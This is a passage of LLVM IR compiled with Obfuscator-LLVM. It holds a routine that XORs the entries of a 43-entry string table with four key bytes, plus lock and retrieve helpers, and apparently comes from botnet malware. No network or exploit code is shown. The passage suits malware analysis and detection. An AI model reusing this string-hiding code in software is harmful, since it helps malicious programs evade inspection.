  br label %27

; <label>:27:                                     ; preds = %83, %1
  %28 = load i32, i32* %3, align 4
  %29 = load %struct.table_value*, %struct.table_value** %4, align 8
  %30 = getelementptr inbounds %struct.table_value, %struct.table_value* %29, i32 0, i32 1
  %31 = load i16, i16* %30, align 8
  %32 = zext i16 %31 to i32
  %33 = icmp slt i32 %28, %32
  br i1 %33, label %34, label %86

; <label>:34:                                     ; preds = %27
  %35 = load i8, i8* %5, align 1
  %36 = zext i8 %35 to i32
  %37 = load %struct.table_value*, %struct.table_value** %4, align 8
  %38 = getelementptr inbounds %struct.table_value, %struct.table_value* %37, i32 0, i32 0
  %39 = load i8*, i8** %38, align 8
  %40 = load i32, i32* %3, align 4
  %41 = sext i32 %40 to i64
  %42 = getelementptr inbounds i8, i8* %39, i64 %41
  %43 = load i8, i8* %42, align 1
  %44 = sext i8 %43 to i32
  %45 = xor i32 %44, %36
  %46 = trunc i32 %45 to i8
  store i8 %46, i8* %42, align 1
  %47 = load i8, i8* %6, align 1
  %48 = zext i8 %47 to i32
  %49 = load %struct.table_value*, %struct.table_value** %4, align 8
  %50 = getelementptr inbounds %struct.table_value, %struct.table_value* %49, i32 0, i32 0
  %51 = load i8*, i8** %50, align 8
  %52 = load i32, i32* %3, align 4
  %53 = sext i32 %52 to i64
  %54 = getelementptr inbounds i8, i8* %51, i64 %53
  %55 = load i8, i8* %54, align 1
  %56 = sext i8 %55 to i32
  %57 = xor i32 %56, %48
  %58 = trunc i32 %57 to i8
  store i8 %58, i8* %54, align 1
  %59 = load i8, i8* %7, align 1
  %60 = zext i8 %59 to i32
  %61 = load %struct.table_value*, %struct.table_value** %4, align 8
  %62 = getelementptr inbounds %struct.table_value, %struct.table_value* %61, i32 0, i32 0
  %63 = load i8*, i8** %62, align 8
  %64 = load i32, i32* %3, align 4
  %65 = sext i32 %64 to i64
  %66 = getelementptr inbounds i8, i8* %63, i64 %65
  %67 = load i8, i8* %66, align 1
  %68 = sext i8 %67 to i32
  %69 = xor i32 %68, %60
  %70 = trunc i32 %69 to i8
  store i8 %70, i8* %66, align 1
  %71 = load i8, i8* %8, align 1
  %72 = zext i8 %71 to i32
  %73 = load %struct.table_value*, %struct.table_value** %4, align 8
  %74 = getelementptr inbounds %struct.table_value, %struct.table_value* %73, i32 0, i32 0
  %75 = load i8*, i8** %74, align 8
  %76 = load i32, i32* %3, align 4
  %77 = sext i32 %76 to i64
  %78 = getelementptr inbounds i8, i8* %75, i64 %77
  %79 = load i8, i8* %78, align 1
  %80 = sext i8 %79 to i32
  %81 = xor i32 %80, %72
  %82 = trunc i32 %81 to i8
  store i8 %82, i8* %78, align 1
  br label %83

; <label>:83:                                     ; preds = %34
  %84 = load i32, i32* %3, align 4
  %85 = add nsw i32 %84, 1
  store i32 %85, i32* %3, align 4
  br label %27

; <label>:86:                                     ; preds = %27
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @table_lock_val(i8 zeroext) #0 {
  %2 = alloca i8, align 1
  %3 = alloca %struct.table_value*, align 8
  store i8 %0, i8* %2, align 1
  %4 = load i8, i8* %2, align 1
  %5 = zext i8 %4 to i64
  %6 = getelementptr inbounds [43 x %struct.table_value], [43 x %struct.table_value]* @table, i64 0, i64 %5
  store %struct.table_value* %6, %struct.table_value** %3, align 8
  %7 = load i8, i8* %2, align 1
  call void @toggle_obf(i8 zeroext %7)
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i8* @table_retrieve_val(i32, i32*) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32*, align 8
  %5 = alloca %struct.table_value*, align 8
  store i32 %0, i32* %3, align 4
  store i32* %1, i32** %4, align 8
  %6 = load i32, i32* %3, align 4
  %7 = sext i32 %6 to i64
  %8 = getelementptr inbounds [43 x %struct.table_value], [43 x %struct.table_value]* @table, i64 0, i64 %7
  store %struct.table_value* %8, %struct.table_value** %5, align 8
  %9 = load i32*, i32** %4, align 8
  %10 = icmp ne i32* %9, null
  br i1 %10, label %11, label %17

; <label>:11:                                     ; preds = %2
  %12 = load %struct.table_value*, %struct.table_value** %5, align 8
  %13 = getelementptr inbounds %struct.table_value, %struct.table_value* %12, i32 0, i32 1
  %14 = load i16, i16* %13, align 8
  %15 = zext i16 %14 to i32
  %16 = load i32*, i32** %4, align 8
  store i32 %15, i32* %16, align 4
  br label %17

; <label>:17:                                     ; preds = %11, %2
  %18 = load %struct.table_value*, %struct.table_value** %5, align 8
  %19 = getelementptr inbounds %struct.table_value, %struct.table_value* %18, i32 0, i32 0
  %20 = load i8*, i8** %19, align 8
  ret i8* %20
}

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { argmemonly nounwind }
attributes #6 = { nounwind }
attributes #7 = { nounwind readnone }
attributes #8 = { noreturn nounwind }

!llvm.ident = !{!0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
